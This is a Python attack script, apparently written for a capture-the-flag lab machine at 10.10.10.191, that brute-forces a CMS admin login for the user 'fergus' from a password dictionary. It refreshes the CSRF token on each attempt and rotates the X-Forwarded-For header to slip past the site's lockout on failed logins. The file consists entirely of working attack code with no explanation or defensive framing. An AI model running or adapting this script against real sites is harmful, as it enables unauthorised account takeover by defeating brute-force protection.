#!/usr/bin/python3

"""
@author: Evilload, payload, firefly
"""

from pwn import *
import requests
import sys
import re
from time import sleep


def main():
    try:
        p1 = log.progress("Starting brute force")
        p1.status("attacking...")
        with open("dictionary.txt", "r") as file:
            passwords = [x.replace("\n", '') for x in file.readlines()]

        for password in passwords:
            p1.status(f"password: {password}")
            url = "http://10.10.10.191/admin/login"
            # we have the session to avoid the csrf-token pissing of us
            sess = requests.Session()
            reqq = sess.get(url=url)

            # we get and set the csrf-token from the first requests
            csrf_token = re.findall(
                r'name="tokenCSRF" value="(.*)"', reqq.text)[0]

            # to be aware in avoid been blocked for the security mode

            headers = {"X-Forwarded-For": password}
            
            post_data = {"tokenCSRF": csrf_token, "username": "fergus", "password": password, "save": ""}
            # pprint( post_data)
            ress_attack = sess.post(url=url, data=post_data,
                                    headers=headers)

            if "Username or password incorrect" not in ress_attack.text:
                p1.status(f"the password is {password}")
                break

    except Exception as e:
        log.info("Error by: ")
        print(str(e))
        sys.exit(1)
        
    except KeyboardInterrupt:
        log.info("Exiting...")
        sys.exit(0)


if __name__ == "__main__":
    main()
